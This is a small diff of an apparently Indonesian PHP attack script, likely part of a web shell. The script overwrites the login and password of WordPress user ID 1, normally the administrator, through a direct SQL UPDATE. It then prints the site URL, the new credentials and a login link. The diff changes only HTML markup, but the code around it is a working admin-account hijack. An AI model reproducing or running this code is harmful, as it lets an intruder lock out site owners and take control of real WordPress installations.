@@ -15,14 +15,14 @@ $data = @mysql_fetch_array($grab);$site_url = $data["option_value"];
 $query = mysql_query("UPDATE `".$prefix."users` SET `user_login` = '".$user."',`user_pass` = '".$pss."' WHERE `ID` = 1");
 
 if ($query) 
-{echo '<center><h2 class="HsH">Berhasil</h2>
+{echo '<center><h2 class="HsH">Berhasil</center></h2>
 <br><table width="100%"><tr><th width="20%">site</th>
 <th width="20%">user</th><th with="20%">password</th>
 <th width="20%">link</th></tr><tr><td width="20%">
 <font size="2" color="red">'.$site_url.'</font></td><td width="20%">'.$user.'</td>
 <td with="20%">'.$pass.'</td><td width="20%">
 <a href="'.$site_url.'/wp-login.php">
-<font color="#00ff00">login</font></td></tr></table></center>';} 
+<font color="#00ff00">login</font></td></tr></table>';} 
 else echo '<h2 class="HsH"><font color="#ff0000">ERROR !</font></h2>';} 
 else die('<center><h2 class="HsH">Wordpress config Salah Cok</h2></center>');
 exit;
